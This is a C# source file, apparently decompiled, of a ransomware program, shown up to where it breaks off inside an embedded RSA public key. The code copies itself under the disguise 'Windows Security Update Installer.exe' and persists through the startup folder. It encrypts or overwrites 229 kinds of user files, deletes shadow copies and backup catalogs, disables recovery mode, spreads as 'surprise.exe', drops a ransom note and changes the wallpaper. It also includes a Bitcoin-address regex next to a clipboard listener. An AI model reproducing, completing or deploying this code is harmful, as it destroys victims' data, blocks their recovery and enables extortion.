using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "Windows Security Update Installer.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "dumbass.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[2] { "All your files are now encrypted!", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>uChrt51SKQtYUNn6Y7JHk0GRwPe8B+GngPL88UfbospNoNitXvmLab/mhXZs+/mPTn9PZdK7r5MWwLM4eUSfsDAPOKMR4VhqU++MYKOZTGvh5XlzU8xSMlrRlg7xjG5eqHjTjYqyg8AmGiJqhUTYqOL/P7xiijdemcD9wYtUR0E=</Modulus>");
